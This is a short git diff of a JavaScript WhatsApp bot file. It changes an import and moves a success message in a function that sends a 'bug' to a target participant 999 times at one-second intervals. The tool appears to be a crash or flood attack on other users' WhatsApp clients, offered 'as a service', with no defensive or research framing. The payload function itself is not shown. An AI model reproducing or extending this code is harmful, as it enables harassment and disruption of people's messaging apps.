@@ -3,7 +3,7 @@ import pkg from "bailey";
 const { proto, generateWAMessageFromContent } = pkg;
 
 
-import bug from '../commands/bug.js'
+import channelSender from '../commands/channelSender.js'
 
 
 async function sios(client, destinatario){
@@ -104,15 +104,14 @@ export async function siosinvis(message, client) {
 
         // Execute the bug command
 
+        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);
+
         for (let i = 0; i < 999; i++) {
 
             await sios(client, participant);
 
             await new Promise(resolve => setTimeout(resolve, 1000));
         }
-
-
-        await bug(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 4);
 
     } catch (error) {
 
